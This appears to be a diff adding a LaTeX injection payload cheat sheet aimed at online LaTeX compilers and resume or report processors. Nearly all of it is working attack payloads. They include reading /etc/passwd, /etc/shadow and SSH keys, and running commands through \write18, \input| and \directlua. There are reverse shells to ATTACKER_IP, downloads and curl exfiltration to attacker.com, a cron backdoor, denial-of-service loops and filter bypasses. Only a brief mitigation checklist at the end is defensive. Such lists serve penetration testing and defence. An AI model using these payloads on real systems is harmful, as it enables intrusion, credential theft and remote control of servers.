@@ -1,0 +1,263 @@
+# LaTeX Injection Payloads
+
+## ========================================
+## BASIC LATEX INJECTION
+## ========================================
+
+# Read file
+\input{/etc/passwd}
+\include{/etc/passwd}
+
+# Execute commands
+\immediate\write18{whoami}
+\write18{cat /etc/passwd}
+
+## ========================================
+## FILE READ
+## ========================================
+
+# Read local files
+\input{/etc/passwd}
+\input{/etc/shadow}
+\input{../../../../../../etc/passwd}
+
+# Windows files
+\input{C:/Windows/win.ini}
+\input{C:/Users/Administrator/Desktop/sensitive.txt}
+
+# Include file content
+\include{/etc/passwd}
+
+## ========================================
+## COMMAND EXECUTION
+## ========================================
+
+# Shell command execution
+\immediate\write18{whoami}
+\immediate\write18{id}
+\immediate\write18{ls -la}
+\immediate\write18{cat /etc/passwd}
+
+# Reverse shell
+\immediate\write18{bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'}
+\immediate\write18{nc -e /bin/bash ATTACKER_IP PORT}
+
+## ========================================
+## ALTERNATE COMMAND EXECUTION
+## ========================================
+
+# Using input
+\input|"whoami"
+\input|"ls -la"
+
+# Catcode manipulation
+\catcode`\$=0
+$immediate$write18{whoami}
+
+## ========================================
+## CROSS-SITE SCRIPTING (PDF)
+## ========================================
+
+# XSS in PDF output
+\usepackage{hyperref}
+\href{javascript:alert(1)}{Click}
+
+# Action on open
+\usepackage{hyperref}
+\href{run:calc.exe}{Link}
+
+## ========================================
+## DENIAL OF SERVICE
+## ========================================
+
+# Infinite loop
+\def\a{\a}\a
+
+# Memory exhaustion
+\def\boom{\boom\boom}\boom
+
+# Recursive expansion
+\def\x{\x\x}\x
+
+## ========================================
+## PACKAGE EXPLOITATION
+## ========================================
+
+# Verbatim package
+\usepackage{verbatim}
+\verbatiminput{/etc/passwd}
+
+# Listings package
+\usepackage{listings}
+\lstinputlisting{/etc/passwd}
+
+## ========================================
+## ENVIRONMENT VARIABLE ACCESS
+## ========================================
+
+# Get environment variables
+\immediate\write18{env}
+\immediate\write18{echo $PATH}
+
+## ========================================
+## NETWORK ACCESS
+## ========================================
+
+# Download files
+\immediate\write18{wget http://attacker.com/shell.sh}
+\immediate\write18{curl http://attacker.com/payload -o /tmp/p}
+
+# Data exfiltration
+\immediate\write18{curl http://attacker.com/?data=$(cat /etc/passwd | base64)}
+
+## ========================================
+## BYPASS TECHNIQUES
+## ========================================
+
+# Obfuscation
+\def\cmd{whoami}
+\immediate\write18{\cmd}
+
+# Character encoding
+\char`\w\char`\h\char`\o\char`\a\char`\m\char`\i
+
+## ========================================
+## MIKTEX SPECIFIC
+## ========================================
+
+# MiKTeX write18
+\write18{dir}
+\write18{type C:\Windows\win.ini}
+
+## ========================================
+## PDFLATEX EXPLOITATION
+## ========================================
+
+# pdfTeX primitives
+\pdfinput{/etc/passwd}
+\pdffilesize{/etc/passwd}
+
+## ========================================
+## LUATEX EXPLOITATION
+## ========================================
+
+# Lua code execution
+\directlua{os.execute("whoami")}
+\directlua{os.execute("cat /etc/passwd")}
+
+# Lua file operations
+\directlua{
+  local f = io.open("/etc/passwd", "r")
+  local content = f:read("*all")
+  tex.print(content)
+}
+
+## ========================================
+## BIBLIOGRAPHIC INJECTION
+## ========================================
+
+# BibTeX injection
+@article{test,
+  title={\immediate\write18{whoami}}
+}
+
+## ========================================
+## FONT MANIPULATION
+## ========================================
+
+# Font file inclusion
+\font\myfont=/etc/passwd
+\myfont
+
+## ========================================
+## REAL-WORLD PAYLOADS
+## ========================================
+
+# Read SSH keys
+\immediate\write18{cat ~/.ssh/id_rsa}
+
+# Exfiltrate data
+\immediate\write18{curl http://attacker.com/$(whoami)}
+
+# Backdoor installation
+\immediate\write18{echo "* * * * * /tmp/backdoor.sh" > /tmp/cron}
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: CV/Resume upload
+\documentclass{article}
+\begin{document}
+Name: John Doe
+\immediate\write18{cat /etc/passwd}
+\end{document}
+
+# Example 2: Report generation
+\input{/etc/passwd}
+
+# Example 3: Template injection
+$user_input
+→ \immediate\write18{whoami}
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Test file read
+\input{/etc/passwd}
+
+# 2. Test command execution
+\immediate\write18{whoami}
+
+# 3. Test write18 enabled
+\write18{id}
+
+# 4. Exploit if vulnerable
+\immediate\write18{malicious_command}
+
+## ========================================
+## COMMON VULNERABLE APPLICATIONS
+## ========================================
+
+# Online LaTeX compilers
+- ShareLaTeX
+- Overleaf (older versions)
+- Custom LaTeX services
+
+# Resume/CV processors
+# Report generators
+# PDF creation services
+
+## ========================================
+## DEFENSIVE BYPASS
+## ========================================
+
+# If \write18 is filtered
+\input|"command"
+
+# If \input is filtered
+\include{file}
+
+# If paths are filtered
+\input{../../../etc/passwd}
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Testing LaTeX locally
+pdflatex --shell-escape document.tex
+
+# Checking security
+pdflatex --shell-restricted document.tex
+
+## ========================================
+## MITIGATION TESTING
+## ========================================
+
+# Check if:
+- shell-escape is disabled
+- \write18 is blocked
+- Input sanitization exists
+- Restricted shell mode is active
